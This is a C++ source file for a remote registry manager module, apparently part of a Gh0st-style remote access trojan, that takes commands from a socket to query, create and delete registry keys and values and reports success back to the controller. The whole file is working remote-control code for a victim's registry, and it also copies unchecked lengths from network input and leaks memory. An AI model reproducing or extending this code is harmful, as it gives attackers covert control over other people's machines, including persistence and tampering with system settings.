// RegManager.cpp: implementation of the CRegManager class.
//
//////////////////////////////////////////////////////////////////////
#include "stdafx.h"
#include "RegManager.h"
#include "RegeditOpt.h"
#include "Registry.h"
//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////


CRegManager::CRegManager(CClientSocket *pClient) : CManager(pClient)
{
     //TOKEN_REGEDIT
	 BYTE bToken=TOKEN_REGEDIT;
		  Send((BYTE*)&bToken,1);
}
CRegManager::~CRegManager()
{

}

//没有执行成功
void CRegManager::SendNO()
{
      BYTE bToken=TOKEN_REG_NO;
        Send(&bToken, sizeof(BYTE));
}
//执行成功
void CRegManager::SendOK()
{
    BYTE bToken=TOKEN_REG_OK;
    Send(&bToken, sizeof(BYTE));
}

void CRegManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	switch (lpBuffer[0]){
	case COMMAND_REG_FIND:             //查数据
        if(nSize>=3){
		   Find(lpBuffer[1],(char*)(lpBuffer+2));
		}else{
		   Find(lpBuffer[1],NULL);
		}
		break;
	case COMMAND_REG_DELPATH:           //删除项
         DelPath((char*)lpBuffer+1);
		break;
	case COMMAND_REG_CREATEPATH:         //创建项
        CreatePath((char*)lpBuffer+1);
		break;
	case COMMAND_REG_DELKEY:            //删除键
        DelKey((char*)lpBuffer+1);
		break;
	case COMMAND_REG_CREATKEY:          //创建 子键
           CreateKey((char*)lpBuffer+1);
		break;
	default:
		break;
	}
}
//查询
void CRegManager::Find(char bToken,char* path)
{
   RegeditOpt  reg(bToken);
   if(path!=NULL){
        reg.SetPath(path);
   }
   char *tmp= reg.FindPath();
   if(tmp!=NULL){
     Send((LPBYTE)tmp, LocalSize(tmp));
	  LocalFree(tmp);
   }else{
      SendNO();
   }
   char* tmpd=reg.FindKey();

    if(tmpd!=NULL){
     Send((LPBYTE)tmpd, LocalSize(tmpd));
	  LocalFree(tmpd);
	}else{
	     SendNO();
	}
}

//删除指定项
void CRegManager::DelPath(char *buf)
{
    CRegistry reg(buf[0]);
	if(reg.DeleteKey(buf+1)){
	   // BYTE bToken=TOKEN_REG_OK;
       /// Send(&bToken, sizeof(BYTE));
		SendOK();
	}else{
	   SendNO();
	}
}
//创建项
void CRegManager::CreatePath(char *buf)
{

     CRegistry reg(buf[0]);
	if(reg.CreateKey(buf+1)){
	   SendOK();
	}else{
	    SendNO();
	}

}
//删除键
void CRegManager::DelKey(char *buf)
{
    CRegistry reg(buf[0]);
	REGMSG msg;
	memcpy((void*)&msg,buf+1,sizeof(msg));
	char* tmp=buf+1+sizeof(msg);
    if(msg.valsize>0)
	{   
		if(msg.size>0){                //先处理项
	           char* path=new char[msg.size+1];
		       ZeroMemory(path,msg.size+1);
			   memcpy(path,tmp,msg.size);
			   if(!reg.Open(path)){
			             SendNO();  
						 return;
			   }
			   tmp+=msg.size;
		}
        
		char* key=new char[msg.valsize+1];
		ZeroMemory(key,msg.valsize+1);
		memcpy(key,tmp,msg.valsize);
		if(reg.DeleteValue(key)){
		    SendOK();
		}else
			SendNO();


	}
}
//创建子键
void CRegManager::CreateKey(char *buf)
{
	switch(buf[0]){
	   case MREG_SZ:        //字符
          TestSTR(buf+1);
		   break;
	   case MREG_DWORD:       //DWORD
           TestDWORD(buf+1);
		   break;
	   case MREG_EXPAND_SZ:   //可扩展字符
		   TestEXSTR(buf+1);
		   break;
	   default:
		   break;
	
	} 
}
//字串值
void CRegManager::TestSTR(char *buf)
{

	CRegistry reg(buf[0]);
	REGMSG msg;
	memcpy((void*)&msg,buf+1,sizeof(msg));
	char* tmp=buf+1+sizeof(msg);
	 if(msg.valsize>0&&msg.size>0)
	{   
		if(msg.count>0){                //先处理项
	           char* path=new char[msg.count+1];
		       ZeroMemory(path,msg.count+1);
			   memcpy(path,tmp,msg.count);
			   if(!reg.Open(path)){
			             SendNO();  
						 return;
			   }
			   tmp+=msg.count;
			   delete[] path;
		}
		char *key=new char[msg.size+1];
		ZeroMemory(key,msg.size+1);
		memcpy(key,tmp,msg.size);
        tmp+=msg.size;
		if(reg.Write(key,tmp)){
		    SendOK();
		}else{
		    SendNO();
		}
		delete[] key;
		


	}

     
}
DWORD atod(char* ch){
     int len=strlen(ch);
	 DWORD d=0;
	 for(int i=0;i<len;i++){
		 int t=ch[i]-48;   //这位上的数字
	      if(ch[i]>57||ch[i]<48){          //不是数字
		       return d;
		  }
          d*=10;
		  d+=t;
	 }
	 return d;

}
//DWORD 值
void CRegManager::TestDWORD(char *buf)
{

   	CRegistry reg(buf[0]);
	REGMSG msg;
	memcpy((void*)&msg,buf+1,sizeof(msg));
	char* tmp=buf+1+sizeof(msg);
	 if(msg.valsize>0&&msg.size>0)
	{   
		if(msg.count>0){                //先处理项
	           char* path=new char[msg.count+1];
		       ZeroMemory(path,msg.count+1);
			   memcpy(path,tmp,msg.count);
			   if(!reg.Open(path)){
			             SendNO();  
						 return;
			   }
			   tmp+=msg.count;
			   delete[] path;
		}
		char *key=new char[msg.size+1];
		ZeroMemory(key,msg.size+1);
		memcpy(key,tmp,msg.size);
        tmp+=msg.size;
		DWORD d=atod(tmp);               //变为dword
		if(reg.Write(key,d)){
		    SendOK();
		}else{
		    SendNO();
		}
		delete[] key;
		


	}
}
//可扩展处理
void CRegManager::TestEXSTR(char *buf)
{
    CRegistry reg(buf[0]);
	REGMSG msg;
	memcpy((void*)&msg,buf+1,sizeof(msg));
	char* tmp=buf+1+sizeof(msg);
	 if(msg.valsize>0&&msg.size>0)
	{   
		if(msg.count>0){                //先处理项
	           char* path=new char[msg.count+1];
		       ZeroMemory(path,msg.count+1);
			   memcpy(path,tmp,msg.count);
			   if(!reg.Open(path)){
			             SendNO();  
						 return;
			   }
			   tmp+=msg.count;
			   delete[] path;
		}
		char *key=new char[msg.size+1];
		ZeroMemory(key,msg.size+1);
		memcpy(key,tmp,msg.size);
        tmp+=msg.size;
		if(reg.WriteBuf(key,tmp)){
		    SendOK();
		}else{
		    SendNO();
		}
		delete[] key;
	}
}
